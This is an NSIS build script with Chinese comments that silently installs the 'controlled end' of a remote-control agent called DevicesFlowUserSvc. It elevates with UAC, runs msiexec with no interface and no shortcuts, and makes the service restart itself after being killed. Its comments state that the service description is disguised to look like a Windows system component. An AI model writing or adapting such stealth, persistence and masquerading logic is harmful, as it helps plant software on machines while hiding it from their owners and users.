; DevicesFlowUserSvc 受控端静默安装壳
; 双击运行：UAC 提权一次 -> msiexec /qn 静默安装 -> 配置服务自恢复与描述 -> 自动退出
; 构建时占位符替换：__PRODUCT__（产品名）、__MSI__（msi 绝对 Windows 路径，NSIS File 不认相对路径）、
; __VER4__（4 段版本号）、__COMPANY__（公司名）。文件需保存为 UTF-8 BOM。

Unicode true
!include "LogicLib.nsh"
Name "__PRODUCT__"
OutFile "__PRODUCT___Setup.exe"
RequestExecutionLevel admin
SilentInstall silent
Icon "agent_setup.ico"
VIProductVersion "__VER4__"
VIAddVersionKey "ProductName" "__PRODUCT__"
VIAddVersionKey "FileDescription" "__PRODUCT__ Setup"
VIAddVersionKey "CompanyName" "__COMPANY__"
VIAddVersionKey "FileVersion" "__VER4__"
VIAddVersionKey "ProductVersion" "__VER4__"
VIAddVersionKey "LegalCopyright" "__COMPANY__"

Section "install"
  SetOutPath "$TEMP\__PRODUCT___setup"
  File /oname=setup.msi "__MSI__"
  StrCpy $1 "$TEMP\__PRODUCT___setup"

  ; 静默安装到当前管理员用户的 LocalAppData（与 MSI 内置默认一致，显式传更稳）
  ExecWait 'msiexec /i "$1\setup.msi" /qn INSTALLFOLDER="$LOCALAPPDATA\__PRODUCT__" STARTMENUSHORTCUTS=0 DESKTOPSHORTCUTS=0 STARTUPSHORTCUTS=0 INSTALLPRINTER=0' $0

  ; 安装失败：清理并透传 msiexec 退出码
  ${If} $0 <> 0
    RMDir /r "$1"
    SetErrorLevel $0
    Return
  ${EndIf}

  ; 服务故障自动恢复：进程被强杀后 60s 自动拉起，一天重置计数
  ExecWait 'sc failure __PRODUCT__ reset= 86400 actions= restart/60000 restart/60000 restart/60000' $2
  ; 服务描述伪装成系统组件风格
  ExecWait 'sc description __PRODUCT__ "提供设备流用户会话支持"' $2

  RMDir /r "$1"
  SetErrorLevel 0
SectionEnd
